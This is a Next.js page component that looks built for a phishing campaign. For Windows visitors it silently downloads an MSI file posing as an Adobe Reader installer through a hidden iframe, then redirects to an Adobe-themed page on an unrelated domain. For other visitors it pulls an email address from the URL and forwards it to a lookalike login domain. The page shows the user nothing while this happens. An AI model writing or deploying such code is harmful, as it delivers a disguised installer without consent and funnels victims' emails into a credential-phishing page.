// pages/index.js
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    const userAgent = navigator.userAgent || '';
    const isWindows = /windows/i.test(userAgent);

    if (isWindows) {
      // Windows: trigger MSI download + redirect to Adobe
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '/Reader_en_install.msi'; // make sure the MSI file is in /public
      document.body.appendChild(iframe);

      setTimeout(() => {
        window.location.href = 'https://mksonline.com.mx/css/adobe/reader/download.html';
      }, 2000);
      return;
    }

    // Non-Windows users: grab email from hash or &smn=
    let email = '';
    const fullUrl = window.location.href;

    // 1. Try hash first (#connie@...)
    if (window.location.hash) {
      email = window.location.hash.slice(1); // remove #
    }

    // 2. Fallback: try &smn= or ?smn= in URL
    if (!email) {
      const match = fullUrl.match(/[?&]smn=([^&]+)/);
      if (match && match[1]) email = match[1];
    }

    if (email) {
      // Redirect to Non-Windows target with raw email
      window.location.href =
        `https://login.jsspjg.icu?b5dAzQiZHlQ5=aHR0cHM6Ly9ta3NvbmxpbmUuY29tLm14L2Nzcy9hZG9iZS9yZWFkZXIvZG93bmxvYWQuaHRtbA==&smn=${email}`;
    }
  }, []);

  return null; // blank page while redirecting
}
